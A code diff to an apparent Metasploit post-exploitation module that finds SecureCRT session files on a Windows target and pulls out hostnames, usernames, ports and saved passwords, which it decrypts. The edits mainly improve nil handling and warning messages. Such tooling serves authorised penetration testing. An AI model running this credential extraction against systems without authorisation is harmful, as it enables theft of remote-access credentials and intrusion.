@@ -23,7 +23,7 @@ class MetasploitModule < Msf::Post
           [ 'URL', 'https://github.com/HyperSine/how-does-SecureCRT-encrypt-password/blob/master/doc/how-does-SecureCRT-encrypt-password.md']
         ],
         'Author' => [
-          'HyperSine', # Original author of the SecureCRT session description script and one who found the password decryption keys.
+          'HyperSine', # Original author of the SecureCRT session decryption script and one who found the encryption keys.
           'Kali-Team <kali-team[at]qq.com>' # Metasploit module
         ],
         'Platform' => [ 'win' ],
@@ -73,11 +73,11 @@ class MetasploitModule < Msf::Post
       end
 
       file = try_encode_file(file_contents)
-      hostname = Regexp.last_match(1) if Regexp.compile('S:"Hostname"=([^\r\n]*)').match(file)
-      password = securecrt_crypto(Regexp.last_match(1)) if Regexp.compile('S:"Password"=u([0-9a-f]+)').match(file)
-      passwordv2 = securecrt_crypto_v2(Regexp.last_match(1)) if Regexp.compile('S:"Password V2"=02:([0-9a-f]+)').match(file)
-      port = Regexp.last_match(1).to_i(16).to_s if Regexp.compile('D:"\[SSH2\] Port"=([0-9a-f]{8})').match(file)
-      username = Regexp.last_match(1) if Regexp.compile('S:"Username"=([^\r\n]*)').match(file)
+      hostname = Regexp.compile('S:"Hostname"=([^\r\n]*)').match(file) ? Regexp.last_match(1) : nil
+      password = Regexp.compile('S:"Password"=u([0-9a-f]+)').match(file) ? securecrt_crypto(Regexp.last_match(1)) : nil
+      passwordv2 = Regexp.compile('S:"Password V2"=02:([0-9a-f]+)').match(file) ? securecrt_crypto_v2(Regexp.last_match(1)) : nil
+      port = Regexp.compile('D:"\[SSH2\] Port"=([0-9a-f]{8})').match(file) ? Regexp.last_match(1).to_i(16).to_s : nil
+      username = Regexp.compile('S:"Username"=([^\r\n]*)').match(file) ? Regexp.last_match(1) : nil
       tbl << {
         file_name: item['name'],
         hostname: hostname,
@@ -100,6 +100,8 @@ class MetasploitModule < Msf::Post
         return padded_plain_bytes[0..i - 1].force_encoding('UTF-16LE').encode('UTF-8')
       end
     end
+    print_warning('It was not possible to decode one of the v1 passwords successfully, please double check the results!')
+    return nil # We didn't decode the password successfully, so just return nil.
   end
 
   def securecrt_crypto_v2(ciphertext)
@@ -119,8 +121,8 @@ class MetasploitModule < Msf::Post
       return plain_bytes.force_encoding('UTF-8')
     end
 
-    print_error('It seems the user set a configuration password when installing SecureCRT!')
-    print_error('If you know the configuration password, please provide it via the PASSPHRASE option and then run the module again.')
+    print_warning('It seems the user set a configuration password when installing SecureCRT!')
+    print_warning('If you know the configuration password, please provide it via the PASSPHRASE option and then run the module again.')
     return nil
   end
 
@@ -157,7 +159,7 @@ class MetasploitModule < Msf::Post
     parent_key = 'HKEY_CURRENT_USER\\Software\\VanDyke\\SecureCRT'
     # get session file path
     securecrt_path = expand_path(registry_getvaldata(parent_key, 'Config Path') + session.fs.file.separator + 'Sessions')
-    if securecrt_path
+    unless securecrt_path.to_s.empty?
       result = enum_session_file(securecrt_path)
       columns = [
         'Filename',
@@ -187,7 +189,7 @@ class MetasploitModule < Msf::Post
         print_good("Session info stored in: #{path}")
       end
     else
-      print_error('Session path not found')
+      print_error('Could not find the registry entry for the SecureCRT session path. Ensure that SecureCRT is installed on the target.')
     end
   end
 end
